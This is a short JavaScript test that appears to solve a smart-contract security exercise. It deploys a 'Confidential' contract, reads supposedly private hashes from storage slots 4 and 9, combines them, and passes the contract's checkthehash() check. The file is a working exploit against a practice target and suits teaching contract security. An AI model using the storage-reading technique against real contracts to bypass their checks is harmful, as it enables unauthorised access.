const { expect } = require("chai");

describe("Exploit Confidential Contract", function () {
  before(async () => {
    // deploying the target contract
    const Confidential = await ethers.getContractFactory("Confidential");
    target = await Confidential.deploy();
  })
  it("Find the confidential hashes and call the checkthehash() function", async () => {

    try {
      // Step 1: Get the stored data at slot 4 (alice's private hash) of memory using ethers
      const aliceHash = await ethers.provider.getStorageAt(target.address, 4);
      console.log("Alice's confidential hash: ", aliceHash);
      // Step 2: Get the stored data at slot 9 (bob's private hash) of memory using ethers
      const bobHash = await ethers.provider.getStorageAt(target.address, 9);
      console.log("Bob's confidential hash: ", bobHash);
      // Step 3: Call the hash function to find the keccak256 hash of aliceHash and bobHash
      const combinedHash = await target.hash(aliceHash, bobHash);
      // Step 4: Call the checkthehash() function to check if we have the right hash
      const output = await target.checkthehash(combinedHash);
      // test to make sure we got true from checkthehash() function
      console.log("checkthehash() output: ", output);
      // Test case
      expect(output).to.equal(true)
    } catch (err) {
      console.log(err);
    }

  })
});
